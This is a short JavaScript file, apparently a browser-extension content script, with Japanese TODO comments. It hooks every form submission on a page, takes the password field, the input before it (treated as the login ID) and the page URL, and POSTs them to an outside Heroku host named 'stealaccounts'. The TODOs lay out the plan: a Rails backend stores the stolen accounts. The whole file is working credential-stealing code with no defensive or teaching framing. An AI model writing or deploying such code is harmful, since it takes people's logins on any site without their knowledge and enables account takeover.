/**
 * TODO: ■(1)submitにフックして適当な文字をアラート表示する。
 * TODO: ■(2)パスワードを取得してアラート表示する。
 * TODO: ■(3)IDを取得してアラート表示する。
 * TODO: ■(4)表示しているサイトのＵＲＬをアラート表示する。
 * TODO: ■(5)rails側のアプリを作成する。（モデル：accounts   url:string, id:string passwd:string）でscaffold!!
 * TODO: ■(6)openshift or herokuにディプロイする。
 * TODO: ■(7)javascriptから、url、id、passwdをrailsに送信する。
 */ 
 
 
document.addEventListener("submit", function (e) {
  
  var id = getLoginId();
  var passwd = getPassword();
  
  if(id && passwd){
    /* サーバーにaccountを登録する */
    $.ajax({
        type: "POST",
        url: "http://stealaccounts.herokuapp.com/accounts",
        data: { "account[url]"      : getCurrentPageURL(),
                "account[login_id]" : id,
                "account[password]" : passwd
              },
        dataType: "json",
    });
  }
}, false);


/**
 * ログインIDを取得する。
 * @return ログインID
 *
 * パスワードの前のinput要素をログインIDとみなして返す。
 */
function getLoginId(){
	return $(":password").prevAll(":input").eq(0).val();
}

/**
 * パスワードを取得する。
 * @return パスワード
 *
 */
function getPassword(){
	return $(":password").val();
}


/**
 * 現在表示しているサイトのURLを取得する。
 * @return url
 */
function getCurrentPageURL(){
	return location.href;
}
